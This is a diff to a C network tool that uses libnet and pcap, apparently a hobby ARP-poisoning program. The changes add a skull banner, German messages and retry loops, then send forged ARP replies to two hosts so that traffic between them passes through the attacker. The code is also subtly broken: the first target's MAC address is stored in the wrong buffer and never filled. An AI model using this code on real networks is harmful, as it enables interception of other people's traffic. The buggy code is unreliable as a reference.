@@ -10,6 +10,21 @@ void usage(char* name)
     exit(0);
 }
 
+char pic[] =
+"                      ______\n"
+"                   .-"      "-.\n"
+"                  /           \\\n"
+"                 |              |\n"
+"                 |,  .-.  .-.  ,|\n"
+"                 | )(_\e[0;31mo\033[39m/  \\\e[0;31mo\033[39m_)( |\n"
+"                 |/     /\\     \\|\n"
+"       (@_       (_     ^^     _)\n"
+"  _     ) \\_______\\__|IIIIII|__/__________________________\n"
+" (_)@8@8{}<________|-\\IIIIII/-|___________________________>\n"
+"        )_/        \\          /\n"
+"       (@           `--------`\n";
+
+
 int main(int argc, char *argv[])
 {
     libnet_t *l;
@@ -21,8 +36,15 @@ int main(int argc, char *argv[])
     uint32_t target1_ip;
     uint32_t target2_ip;
 
+    uint8_t *target1_mac;
+    uint8_t *target2_mac;
+
     if(argc < 3)
         usage(argv[0]);
+
+    /* Allocate memory for target macs*/
+    target1_mac = ec_malloc(6);
+    target2_mac = ec_malloc(6);
 
     l = libnet_init(LIBNET_LINK, NULL, errbuf);
     if(l == NULL)
@@ -30,7 +52,7 @@ int main(int argc, char *argv[])
     
     // Get device name
     if(pcap_findalldevs(&ift, (char *)(&errbuf)) == -1)
-        fatal("finding devices");
+        fatal("suchen von Netzwerkgeräten");
     
     // Convert Targets ASCII-IP's to Numbers
     if(((target1_ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE)) ==  -1) 
@@ -39,7 +61,7 @@ int main(int argc, char *argv[])
     
     
 
-    printf("Device is %s\n", ift->name);
+    printf("Netzwerkschnittstelle ist %s\n", ift->name);
     
 
      /* Open device for live capture */
@@ -47,25 +69,45 @@ int main(int argc, char *argv[])
      if(handle == NULL)
         fatal("opening live session");
     
+    /* 
+        Get MAC-Addresses from Targets 
+    */
+
     // Set packet filter for incoming ARP-Packets
     set_packet_filter(handle);
     
     // Request Target 1
-    printf("\nTarget #1: sending ARP-requests... \n");
+    printf("\nZiel \033[32m#1\033[39m: sende ARP-requests... \n");
     arp_request(target1_ip, l);
-    // Receive Target 1
-    printf("Target #1: searching for ARP-replys...\n");
-    arp_receive(handle, target1_ip);
 
-    printf("\n-------------------------------\n\n");
+    // Receive Target 1
+    printf("Ziel \033[32m#1\033[39m: suche nach ARP-replys...\n");
+
+    /* Loop goes on until a matching ARP-reply is found */
+
+    while(arp_receive(handle, target1_ip, target2_mac) != 0) arp_request(target1_ip, l);
+    
+    printf("\033[33m\n-------------------------------\033[39m\n\n");
 
     // Request Target 2
-    printf("Target #2: sending ARP-requests... \n");
+    printf("Ziel \033[34m#2\033[39m: sende ARP-requests... \n");
     arp_request(target2_ip, l);
-    // Receive Target 2
-    printf("Target #2: searching for ARP-replys...\n");
-    arp_receive(handle, target2_ip);
 
+    // Receive Target 2
+    printf("Ziel \033[34m#2\033[39m: suche nach ARP-replys...\n");
+    while(arp_receive(handle, target2_ip, target2_mac) != 0) arp_request(target2_ip, l);
+
+    /* 
+        Start ARP-Poisoning
+    */
+
+    printf("\n\t\tStarte ARP-Poisoning\n%s", pic);
+
+    // send a fake arp-reply to target 1 pretending to be target 2
+    arp_reply(target2_ip, target1_ip, target1_mac, l);
+
+   // send a fake arp-reply to target 2 pretending to be target 1
+    arp_reply(target1_ip, target2_ip, target2_mac, l);
 
 }
 
@@ -74,7 +116,7 @@ void set_packet_filter(pcap_t *handle)
     struct bpf_program filter;
     char filter_string[200];
     sprintf(filter_string, "arp");
-    printf("[DEBUG] filter string is %s\n", filter_string);
+    printf("[DEBUG] filter string ist %s\n", filter_string);
 
     if(pcap_compile(handle, &filter, filter_string, 0, 0) == -1)
     {
